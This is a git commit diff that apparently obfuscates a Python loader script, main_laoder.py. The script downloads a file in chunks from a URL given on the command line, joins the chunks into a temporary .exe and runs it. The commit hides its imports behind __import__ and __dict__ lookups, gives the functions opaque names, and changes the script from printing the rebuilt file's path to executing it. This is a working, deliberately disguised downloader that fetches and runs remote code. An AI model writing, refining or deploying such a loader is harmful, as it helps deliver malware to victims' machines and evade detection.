6500beb6293f0ff10b3f162b1bf6bb870b8cf2f6
gegestalt <guneyunal@sabanciuniv.edu>
2025-01-23 10:08:57 +0300

    updated the code with obfuscation, added read me.

--- main_laoder.py
+++ main_laoder.py
@@ -1,51 +1,48 @@
-
-import hashlib
-import os
-import sys
-import requests
-
-import tempfile
-
-
-def generate_filename(n):
-    h = hashlib.sha256()
+def gf(n):
+    h = __import__('hashlib').__dict__['sha256']()
     h.update(str(n).encode())
-    digest = h.hexdigest()[0x0:0xf]
-    filename = tempfile.NamedTemporaryFile(delete=False, suffix=f'__{digest}')
-    return filename.name
+    d = h.hexdigest()[0x0:0xf]
+    f = __import__('tempfile').__dict__['NamedTemporaryFile'](delete=False, suffix=f'__{d}')
+    return f.name
 
-def load_chunks(url):
-    parts = {}
-    with requests.get(url, stream=True) as r:
+
+def lc(u):
+    ps = {}
+    rr = __import__('requests')
+    with rr.get(u, stream=True) as r:
         r.raise_for_status()
-        for i,chunk  in enumerate(r.iter_content(chunk_size=0x4000),start=0x1):
-            if chunk:
-                filename = generate_filename(len(parts))
-                parts[i] = filename
-                with open(filename, "wb") as fh:
-                    fh.write(chunk)
-    return parts
+        for i, c in enumerate(r.iter_content(chunk_size=0x400), start=0x1):
+            if c:
+                f = gf(i)
+                ps[i] = f
+                with open(f, 'wb') as ff:
+                    ff.write(c)
+    return ps
 
-def rebuild_file(parts):
-    new_filename = tempfile.NamedTemporaryFile(delete=False,   suffix=".exe")
-    with open(new_filename.name, "wb") as fh:
-        for part in parts.keys():
-            filename = parts[part]
-            data = open(filename, "rb").read()
-            fh.write(data)
-        return new_filename.name
 
-def start_process(file_path):
-    os.execv(file_path, ["&"])
+def rf(ps):
+    nf = __import__('tempfile').__dict__['NamedTemporaryFile'](delete=False, suffix='.exe')
+    with open(nf.name, 'wb') as fh:
+        for p in ps.keys():
+            f = ps[p]
+            d = open(f, 'rb').read()
+            fh.write(d)
+    return nf.name
+
+
+def sp(file_path):
+    __import__('os').__dict__['execv'](file_path, ["&"])
+
 
 def main():
-    opts = sys.argv
-    if len(opts) < 0x2:
+    o = __import__('sys').__dict__['argv']
+    if len(o) < 0x2:
         return
     else:
-        res = load_chunks(opts[0x1])
-        new_file= rebuild_file(res)
-        print(new_file)
+        r = lc(o[0x1])
+        nf = rf(r)
+        sp(nf)
+
 
 if __name__ == "__main__":
     main()
